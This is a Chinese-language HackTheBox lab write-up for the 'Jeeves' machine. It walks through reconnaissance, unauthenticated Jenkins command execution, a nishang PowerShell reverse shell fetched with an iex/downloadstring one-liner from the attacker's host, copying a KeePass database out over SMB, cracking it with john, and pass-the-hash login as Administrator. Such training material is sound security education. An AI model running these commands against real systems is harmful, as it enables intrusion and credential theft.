Jeeves
是一个中等难度的靶机，知识点涉及Jeekins远程代码执行漏洞、KeePass解密、哈希传递、NTFS数据流读取等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-19
上午9.14.33](https://image.3001.net/images/20221021/1666314143_6351ef9f0a41f58de8393.png!small)  
 _通关思维导图_  
![Jeeves](https://image.3001.net/images/20221021/1666314146_6351efa22c62d99dae0e3.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.63 -oA nmap_Jeeves
    

![截屏2021-10-19
上午9.33.14](https://image.3001.net/images/20221021/1666314148_6351efa4167f3e4a3cc9e.png!small)  
扫描结果显示目标开放端口为80、135、445以及50000端口

#### 80端口

网页中存在搜索框  
![截屏2021-10-19
上午10.10.50](https://image.3001.net/images/20221021/1666314151_6351efa7d2cb57fb2d3cd.png!small)

尝试进行搜索出现报错，报错信息显示数据库为 SQL server 2005  
![截屏2021-10-19
上午10.14.01](https://image.3001.net/images/20221021/1666314153_6351efa958f170bc29be9.png!small)

#### 50000端口

位于50000端口的 Jetty 中间件版本为9.4.z  
![截屏2021-10-19
上午10.14.19](https://image.3001.net/images/20221021/1666314155_6351efab15b5b0a313196.png!small)

使用 searchsploit 寻找 Jettty 的相关漏洞，结果存在一个目录穿越漏洞，但是未能成功利用

    
    
    searchsploit jetty
    

![截屏2021-10-19
上午10.15.06](https://image.3001.net/images/20221021/1666314156_6351efac69a777b52924e.png!small)

使用 gobuster 目录扫描寻找可能存在的应用，成功发现`askjeeves`目录

    
    
    gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
    

![截屏2021-10-19
下午12.44.06](https://image.3001.net/images/20221021/1666314158_6351efae4229ca6a30f6c.png!small)

访问后界面显示为 Jenkins 应用，版本为2.87  
![截屏2021-10-19
上午11.12.41](https://image.3001.net/images/20221021/1666314159_6351efafe8892a1c09332.png!small)

## 0x02 上线[kohsuke]

### Jenkins远程代码执行

> Jenkins是一款提供软件开发的持续集成服务的工具，它运行在Servlet容器中（例如Apache
> Tomcat）。支持软件配置管理（SCM）工具（包括AccuRev
> SCM、CVS、Subversion、Git、Perforce、Clearcase和RTC），可以执行基于Apache Ant和Apache
> Maven的项目的任意的 Shell 脚本和 Windows 批处理命令

使用 searchsploit 查找相关漏洞，但并没有找到与当前版本相关的漏洞

    
    
    searchsploit jenkins
    

![截屏2021-10-19
下午12.46.36](https://image.3001.net/images/20221021/1666314161_6351efb1bb7dec57c9913.png!small)

在浏览界面时发现目标存在用户`admin`，尝试爆破弱口令无果  
![截屏2021-10-19
下午12.48.36](https://image.3001.net/images/20221021/1666314163_6351efb383ff5e0a89833.png!small)

于是尝试在未登陆情况下操作 Jenkins，点击`New Item`并在中创建项目`test`  
![截屏2021-10-19
下午12.59.56](https://image.3001.net/images/20221021/1666314164_6351efb4ea8ca281a61c3.png!small)

在`Build Environmnet`中选择`Execute Windows batch command`，尝试执行 ping 命令  
![截屏2021-10-19
下午1.00.57](https://image.3001.net/images/20221021/1666314166_6351efb65eba8a0caa23e.png!small)  
![截屏2021-10-19
下午3.00.41](https://image.3001.net/images/20221021/1666314167_6351efb7c222fc2ead56c.png!small)

点击`build now`，查看输出结果发现命令成功执行，说明可能存在命令注入漏洞  
![截屏2021-10-19
下午1.02.59](https://image.3001.net/images/20221021/1666314169_6351efb916c219c351dce.png!small)

使用 nishang 中的`Invoke-PowerShellTcp.ps1`脚本进行反弹

    
    
    cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . 
    

在脚本最后添加地址和端口用于反弹

    
    
    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 5555
    

同时在当前目录开启 http 服务

    
    
    python3 -m http.server 80
    

在本地监听5555端口

    
    
    nc -nvlp 5555
    

在项目中设置执行命令用于反弹shell

    
    
    powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')
    

![截屏2021-10-19
下午3.05.37](https://image.3001.net/images/20221021/1666314170_6351efba9c8b168abb876.png!small)

完成后点击`build now`执行命令  
![截屏2021-10-19
下午3.09.51](https://image.3001.net/images/20221021/1666314171_6351efbbbcddbcee763a1.png!small)

成功拿到反弹shell  
![截屏2021-10-19
下午3.08.56](https://image.3001.net/images/20221021/1666314173_6351efbd08cb3f6a72f13.png!small)

在当前用户桌面上寻找 flag 并成功拿到第一个flag

    
    
    dir c:\Users\kohsuke\Desktop
    type c:\Users\kohsuke\Desktop\user.txt
    

![截屏2021-10-19
下午3.12.46](https://image.3001.net/images/20221021/1666314174_6351efbe6aae8e3e541b8.png!small)

### 远程代码执行扩展

同样在如下目录中也发现了执行命令界面

    
    
    `http://10.10.10.63:50000/askjeeves/script`
    

测试 ping 命令可成功执行  
![截屏2021-10-19
下午3.23.20](https://image.3001.net/images/20221021/1666314175_6351efbfabe3bc06df430.png!small)

构造命令用于执行反弹shell

    
    
    cmd = """ powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1') """
    println cmd.execute().text
    

## 0x03 权限提升[administrator]

### 检查系统配置

使用`PowerUp`检查 Windows 操作系统的危险配置、泄露密码，但是并未发现有用的信息

    
    
    iex(new-object net.webclient).downloadstring('http://10.10.14.3/PowerUp.ps1')
    Invoke-AllChecks
    

![截屏2021-10-19
下午3.32.07](https://image.3001.net/images/20221021/1666314177_6351efc137744f33aeac0.png!small)

### KeePass密码破解

查看当前用户的文档目录发现 KeePass 加密数据库，而打开 Keepass 数据库需要密码或密钥

    
    
    dir c:\Users\kohsuke\Documents
    

![截屏2021-10-19
下午4.07.56](https://image.3001.net/images/20221021/1666314179_6351efc33d92dd9f7f47d.png!small)

因此需要寻找`.key`文件，尝试寻找但是并没找到该类型文件

    
    
    where.exe /r c:\ *.key
    

![截屏2021-10-19
下午4.18.26](https://image.3001.net/images/20221021/1666314180_6351efc487f2c0f540d1d.png!small)

在本地中使用 smbserver 开启smb服务

    
    
    python3 smbserver.py mac ~/hackthebox/Machines/Jeeves
    

![截屏2021-10-19
下午4.56.02](https://image.3001.net/images/20221021/1666314181_6351efc5eab8bca0013d6.png!small)

通过 smb 协议将该文件下载下来，尝试哈希破解。执行命令传输`CEH.kdbx`

    
    
    cd c:\Users\kohsuke\Documents\
    copy CEH.kdbx \\10.10.14.3\mac
    

![截屏2021-10-19
下午8.14.04](https://image.3001.net/images/20221021/1666314183_6351efc778635b601ae25.png!small)  
![截屏2021-10-19
下午8.13.54](https://image.3001.net/images/20221021/1666314185_6351efc9411393a65451d.png!small)

使用 keepss2john 将 KeePass 数据库文件转换为可识别的哈希

    
    
    keepass2john CEH.kdbx > CEH.hash
    

![截屏2021-10-19
下午8.18.22](https://image.3001.net/images/20221021/1666314186_6351efcac27eef656c1d5.png!small)

使用 john 进行密码破解，成功拿到密码`moonshine1`

    
    
    john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    

![截屏2021-10-19
下午8.22.44](https://image.3001.net/images/20221021/1666314188_6351efcc6a758183b029e.png!small)

### 哈希传递

使用 keepass2 打开该文件，如果未安装可直接使用 apt 进行安装

    
    
    apt install keepass2
    keepass2 CEH.kdbx
    

![截屏2021-10-19
下午11.28.37](https://image.3001.net/images/20221021/1666314190_6351efce1fb764c327189.png!small)

输入以上密码后可打开文件  
![截屏2021-10-19
下午11.30.14](https://image.3001.net/images/20221021/1666314191_6351efcfb64cd88298167.png!small)

按`ctrl + h`可以显示密码，拿到 NTLM 哈希如下：

    
    
    aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
    

使用 smbmap 进行测试，成功访问说明该哈希值正确

    
    
    smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' -H 10.10.10.63
    

![截屏2021-10-19
下午11.40.54](https://image.3001.net/images/20221021/1666314192_6351efd0f2bdb737c6c7a.png!small)

使用 pth-winexe 通过哈希传递的方式成功登录管理员账户

    
    
    pth-winexe -U Administrator%'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.10.10.63 cmd.exe
    

![截屏2021-10-19
下午11.54.26](https://image.3001.net/images/20221021/1666314194_6351efd251d4e53ddb7a1.png!small)

### 寻找flag

在管理员桌面上寻找第二个flag，其中的文本显示 flag 在其他地方，需要深入寻找

    
    
    cd c:\Users\Administrator\Desktop
    type hm.txt
    

![截屏2021-10-19
下午11.55.53](https://image.3001.net/images/20221021/1666314196_6351efd44ba2da678db04.png!small)

使用 /r 参数可显示隐藏文件

    
    
    dir /r
    

![截屏2021-10-20
上午12.00.20](https://image.3001.net/images/20221021/1666314198_6351efd64f5d8b1578307.png!small)

通过 NTFS 数据流读取`root.txt`，成功拿到第二个flag

    
    
    more < hm.txt:root.txt:$DATA
    

![截屏2021-10-20
上午12.07.09](https://image.3001.net/images/20221021/1666314199_6351efd7a981f6368af7c.png!small)

## 0x04 总结

Jeeves 出自英国短片小说 My Man Jeeves，Jeeves 男仆其实就是 Jenkis 平台的标志。通过信息收集发现 Jenkis
管理页面在未授权访问情况下可完成远程代码执行，利用该漏洞执行命令完成反弹shell，从而成功获取用户权限。

服务器中存在 KeePass 数据库文件，但是通过搜索并未发现用于解密的 key，衍生思路在本地进行哈希破解。将该文件下载至本地后利用
keepass2john 拿到哈希，使用 john 进行哈希解密并成功破解出密码，利用该密码打开数据库发现其中存在管理员的 NTLM 哈希。

利用哈希传递可成功拿到管理员权限，但管理员桌面上并未发现flag，使用`dir /r`命令可显示隐藏的 flag 文件，同时该文件无法直接读取，最终需要借助
NTFS 数据流才能成功读取。

